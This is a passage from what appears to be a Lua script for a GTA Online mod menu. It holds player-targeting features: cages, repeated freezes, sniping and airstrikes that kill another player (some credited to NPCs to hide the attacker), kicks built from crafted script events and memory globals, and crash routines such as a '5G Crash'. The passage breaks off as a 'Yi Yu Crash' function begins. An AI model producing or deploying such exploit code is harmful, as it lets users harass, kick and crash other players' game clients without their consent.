local cage_object5 = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z + .75, true, true, false) -- above
cages[#cages + 1] = cage_object
cages[#cages + 1] = cage_object
util.yield(15)
local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 90
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

menu.action(cage_options, "Stunt Tube", {"stuntcage"}, "", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
STREAMING.REQUEST_MODEL(2081936690)

while not STREAMING.HAS_MODEL_LOADED(2081936690) do
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(2081936690, pos.x, pos.y, pos.z, true, true, false)
cages[#cages + 1] = cage_object
util.yield(15)
local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 90
ENTITY.SET_ENTITY_ROTATION(cage_object, rot.x,rot.y,rot.z,1,true)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(cage_object)
menu.trigger_commands("disarm" .. players.get_name(csPID))
end)

local cage_loop = false
menu.toggle(cage_options, "automatic", {"autocage"}, "Cage them in a trap. If they get out... Do it again. No, I'll do it for you actually", function(on)
local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position
cage_loop = on
if cage_loop then
if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(csPID).." on")
util.yield(300)
if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
    menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(csPID).." off")
    return
end
menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(csPID).." off")
a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
end
cage_player(a)
end
while cage_loop do
local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)) --current position
local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z}
if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then --now I know there's a native to find distance between coords but I like this >_<
a = b
if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then
    goto continue
end
cage_player(a)
::continue::
end
util.yield(1000)
end
end)

menu.action(cage_options, "Slowly Burn Them To Death", {}, "use this to slowly kill the poor caged person (ONLY WORKS WITH SOME CAGES)", function()
local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID))
local hash = util.joaat("prop_beach_fire")
STREAMING.REQUEST_MODEL(hash)
while not STREAMING.HAS_MODEL_LOADED(hash) do
STREAMING.REQUEST_MODEL(hash)
util.yield()
end
local cage_object = OBJECT.CREATE_OBJECT(hash, pos.x, pos.y, pos.z - 1.75, true, true, false) -- front

cages[#cages + 1] = cage_object

local rot  = ENTITY.GET_ENTITY_ROTATION(cage_object)
rot.y = 90
end)

menu.action(cage_options, "Release Player", {"release"}, "Attempts to delete spawned cages, for more complicated traps it may respawn.", function() -- ez fix but lazy
menu.trigger_commands("superc 3")
end)


    menu.action(MenuPlayerTrollingCage, "Electric Cage", {"gsplayertrollingcageec"}, "A Cage made of Transistors, that will Taze the Player.", function(on_click)
        local number_of_cages = 6
        local elec_box = util.joaat("prop_elecbox_12")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        pos.z = pos.z - 0.5
        request_model(elec_box)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(2.5)
            obj_pos:add(pos)
            for offs_z = 1, 5 do
                local electric_cage = entities.create_object(elec_box, obj_pos)
                spawned_objects[#spawned_objects + 1] = electric_cage
                ENTITY.SET_ENTITY_ROTATION(electric_cage, 90.0, 0.0, angle, 2, 0)
                obj_pos.z = obj_pos.z + 0.75
                ENTITY.FREEZE_ENTITY_POSITION(electric_cage, true)
            end
        end
    end)

    menu.action(MenuPlayerTrollingCage, "Coffin Cage", {"gsplayertrollingcagecc"}, "Spawns 6 Coffins around the Player.", function(on_click)
        local number_of_cages = 6
        local coffin_hash = util.joaat("prop_coffin_02b")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(coffin_hash)
        local temp_v3 = v3.new(0, 0, 0)
        for i = 1, number_of_cages do
            local angle = (i / number_of_cages) * 360
            temp_v3.z = angle
            local obj_pos = temp_v3:toDir()
            obj_pos:mul(0.8)
            obj_pos:add(pos)
            obj_pos.z = obj_pos.z + 0.1
           local coffin = entities.create_object(coffin_hash, obj_pos)
           spawned_objects[#spawned_objects + 1] = coffin
           ENTITY.SET_ENTITY_ROTATION(coffin, 90.0, 0.0, angle,  2, 0)
           ENTITY.FREEZE_ENTITY_POSITION(coffin, true)
        end
    end)


    menu.action(MenuPlayerTrollingCage, "Shipping Container Cage", {"gsplayertrollingcagescc"}, "Spawns a Shipping Container on the Player.", function(on_click)
        local container_hash = util.joaat("prop_container_ld_pu")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        pos.z = pos.z - 1
        local container = entities.create_object(container_hash, pos, 0)
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    menu.action(MenuPlayerTrollingCage, "Box Truck Cage", {"gsplayertrollingcagebtc"}, "Spawns a Box Truck on the Player.", function(on_click)
        local container_hash = util.joaat("boxville3")
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
        request_model(container_hash)
        local container = entities.create_vehicle(container_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
        spawned_objects[#spawned_objects + 1] = container
        ENTITY.SET_ENTITY_VISIBLE(container, false)
        ENTITY.FREEZE_ENTITY_POSITION(container, true)
    end)

    menu.action(MenuPlayerTrollingCage, "Delete Spawned Cages", {"gsplayertrollingcagedsc"}, "Deletes all the Cages that you have Spawned.", function(on_click)
        local entitycount = 0
        for i, object in ipairs(spawned_objects) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(object, false, false)
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(object)
            entities.delete_by_handle(object)
            spawned_objects[i] = nil
            entitycount = entitycount + 1
        end
        util.toast("-Genesis-\n\nCleared " .. entitycount .. " Cages that you have Sawned.")
    end) 

        --Trolling Freze Options

    player_toggle_loop(MenuPlayerTrollingFreeze, csPID, "Hard Freeze", {"gsplayertrollingfreezehf"}, "Runs a Script Event that Freezes the Player Repeatedly.", function(on)
        util.trigger_script_event(1 << csPID, {0x4868BC31, csPID, 0, 0, 0, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(MenuPlayerTrollingFreeze, csPID, "Phase Freeze", {"gsplayertrollingfreezepf"}, "Runs a On Tick Freeze Event, so the Person is still Able to Move a Little.", function(on)
        util.trigger_script_event(1 << csPID, {0x7EFC3716, csPID, 0, 1, 0, 0})
        util.yield(500)
    end)

    player_toggle_loop(MenuPlayerTrollingFreeze, csPID, "Clear Tasks", {"gsplayertrollingfreezect"}, "Clears all Tasks from the Player Ped every Tick, which Results in a Freeze.", function(on)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(pidPed)
    end)


    --Player Root Killing

        -- Owned Killing Options --

    menu.action(MenuPlayerKillingOwned, "Snipe Player", {"gsplayerkillingownedsnipe"}, "Spawns a Bullet Right in Front of the Player. Can be used to 'Snipe' People out of Cars or Jets.", function(on_click)
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(csPID)..">Spectate>Legit Method", 33))
        util.yield(500)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local onPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, .5)
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .8, 1)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(csPID)..">Spectate>Legit Method", 33))
        util.yield(500)
    end)

    menu.action(MenuPlayerKillingOwned, "Snipe Player V2", {"gsplayerkillingownedsnipe2"}, "Spawns 10 Bullets almost in the Player in Slightly Incrementing Distances, so it Rarely Misses.", function(on_click)
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(csPID)..">Spectate>Legit Method", 33))
        util.yield(500)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local onPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, .5)
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .3, .9)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .4, .8)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .5, .7)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .5, .6)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .5, .5)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 1, .9)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 2, .8)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 3, .7)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 4, .6)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 5, .5)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 350, true, 205991906, players.user_ped(), true, false, 100) --205991906 is Heavy Sniper 
        menu.trigger_command(menu.ref_by_path("Players>"..players.get_name_with_tags(csPID)..">Spectate>Legit Method", 33))
        util.yield(500)
    end)

    menu.action(MenuPlayerKillingOwned, "Airstrike Player", {"gsplayerkillingownedairstrike"}, "Shoots 8 Rockets at them from the Sky.", function(on_click)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local abovePed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, 50)
        local abovePed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, 15)
        local onPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, .5)
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 3, 1)
        local frontOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 5, 1)
        local backOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, -3, 1)
        local backOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, -5, 1)
        local rightOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 3, 0, 1)
        local rightOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 5, 0, 1)
        local leftOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, -3, 0, 1)
        local leftOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, -5, 0, 1)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed2.x, abovePed2.y, abovePed2.z, onPed.x, onPed.y, onPed.z, 100, true, 1233104067, players.user_ped(), true, false, 100) --1233104067 is Flare
        util.yield(5000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, backOfPed.x, backOfPed.y, backOfPed.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, leftOfPed.x, leftOfPed.y, leftOfPed.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, frontOfPed.x, frontOfPed.y, frontOfPed.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, rightOfPed.x, rightOfPed.y, rightOfPed.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, backOfPed2.x, backOfPed2.y, backOfPed2.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, leftOfPed2.x, leftOfPed2.y, leftOfPed2.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, frontOfPed2.x, frontOfPed2.y, frontOfPed2.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, rightOfPed2.x, rightOfPed2.y, rightOfPed2.z, 100, true, 1752584910, players.user_ped(), true, false, 250) --1752584910 is Homing Missle
    end)
    

        -- Anonymous Killing Options --

    menu.action(MenuPlayerKillingAnon, "Snipe Player", {"gsplayerkillinganonsnipe"}, "Spawns a Bullet Right in Front of the Player. Can be used to 'Snipe' People out of Cars or Jets.", function(on_click)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        for k, ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ent, pidPed, 17) then
                local onPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, .5)
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .8, 1)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                break
            end
        end
    end)

    menu.action(MenuPlayerKillingAnon, "Snipe Player V2", {"gsplayerkillinganonsnipe2"}, "Spawns 10 Bullets almost in the Player in Slightly Incrementing Distances, so it Rarely Misses.", function(on_click)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        for k, ent in pairs(entities.get_all_peds_as_handles()) do
            if not PED.IS_PED_A_PLAYER(ent) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ent, pidPed, 17) then
                local onPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, .5)
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .3, .9)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .4, .8)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .5, .7)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .5, .6)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, .5, .5)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 1, .9)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 2, .8)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 3, .7)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 4, .6)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 5, .5)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(frontOfPed.x, frontOfPed.y, frontOfPed.z, onPed.x, onPed.y, onPed.z, 3500, true, 205991906, ent, true, false, 100) --205991906 is Heavy Sniper 
                break
            end
        end
    end)

    menu.action(MenuPlayerKillingAnon, "Airstrike Player", {"gsplayerkillinganonairstrike"}, "Shoots 8 Rockets at them from the Sky.", function(on_click)
        local pidPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(csPID)
        local abovePed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, 50)
        local abovePed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, 15)
        local onPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 0, .5)
        local frontOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 3, 1)
        local frontOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, 5, 1)
        local backOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, -3, 1)
        local backOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 0, -5, 1)
        local rightOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 3, 0, 1)
        local rightOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, 5, 0, 1)
        local leftOfPed = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, -3, 0, 1)
        local leftOfPed2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(pidPed, -5, 0, 1)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed2.x, abovePed2.y, abovePed2.z, onPed.x, onPed.y, onPed.z, 100, true, 1233104067, 0, true, false, 100) --1233104067 is Flare
        util.yield(5000)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, backOfPed.x, backOfPed.y, backOfPed.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, leftOfPed.x, leftOfPed.y, leftOfPed.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, frontOfPed.x, frontOfPed.y, frontOfPed.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, rightOfPed.x, rightOfPed.y, rightOfPed.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, backOfPed2.x, backOfPed2.y, backOfPed2.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, leftOfPed2.x, leftOfPed2.y, leftOfPed2.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, frontOfPed2.x, frontOfPed2.y, frontOfPed2.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
        util.yield(500)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(abovePed.x, abovePed.y, abovePed.z, rightOfPed2.x, rightOfPed2.y, rightOfPed2.z, 100, true, 1752584910, 0, true, false, 250) --1752584910 is Homing Missle
    end)


    --Player Root Removals

        --Player Removal Kicks

    if menu.get_edition() >= 2 then 
        menu.action(MenuPlayerRemovalKick, "Intelligent Kick", {"nerd"}, "Multiple Kicks in One. Perfect for basic and regular stand users!", function(on_click)
            util.trigger_script_event(1 << csPID, {0xB9BA4D30, csPID, 0x4, -1, 1, 1, 1})
            util.trigger_script_event(1 << csPID, {0x6A16C7F, csPID, memory.script_global(0x2908D3 + 1 + (csPID * 0x1C5) + 0x13E + 0x7)})
            util.trigger_script_event(1 << csPID, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (csPID * 0x257) + 0x1FE))})
            menu.trigger_commands("bonk" .. players.get_name(csPID))
        end)
    end
 
    if menu.get_edition() >= 2 then
        menu.action(MenuPlayerRemovalKick, "Nuke Kick", {"nuke"}, "Blocks the player join reaction then uses kick.", function()
            menu.trigger_commands("historyblock " .. players.get_name(csPID))
            menu.trigger_commands("kick" .. players.get_name(csPID))
        end)
    end

    if menu.get_edition() >= 2 then
    menu.action(MenuPlayerRemovalKick, "Bonk Kick", {"bonk"}, "Contains 6 SE kicks.", function()
    menu.trigger_commands("kick" .. players.get_name(csPID))
    menu.trigger_commands("givesh" .. players.get_name(csPID))
    send_script_event(se.givecollectible, csPID, {csPID, 0x4, -1, 1, 1, 1}) -- Give Collectible SE
    send_script_event(se.kick1_casino, csPID, {csPID, memory.script_global(glob.sekickarg1 + 1 + (csPID * 466) + 321 + 8)})
    send_script_event(se.kick2, csPID, {players.user(), memory.read_int(memory.script_global(glob.sekickarg2 + 1 + (csPID * 599) + 510))})
    send_script_event(se.givecollectible, csPID, {csPID, 0x4, -1, 1, 1, 1})
    send_script_event(se.kick1_casino, csPID, {csPID, memory.script_global(glob.sekickarg1 + 1 + (csPID * 466) + 321 + 8)})
    send_script_event(se.kick2, csPID, {players.user(), memory.read_int(memory.script_global(glob.sekickarg2 + 1 + (csPID * 608) + 510))})
        end)
    end
 
        --Player Removal Crashes

     local Crash = menu.list(MenuPlayerRemovalCrash, "Select Crashes", {}, "Other Select Crashes")

    menu.action(Crash, "Host Crash (only for host)", { "" }, "", function()
        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        menu.trigger_commands("tpmazehelipad")
        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
        util.yield(1000)
        menu.trigger_commands("tpmazehelipad")
    end)

    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
    pos.z = pos.z + 10
    veh = entities.get_all_vehicles_as_handles()

    menu.action(Crash, "5G Crash", { "" }, "", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
        pos.z = pos.z + 10
        veh = entities.get_all_vehicles_as_handles()

        for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
        end
    end)

    menu.action(Crash, "Yi Yu Crash", { "" }, "", function()
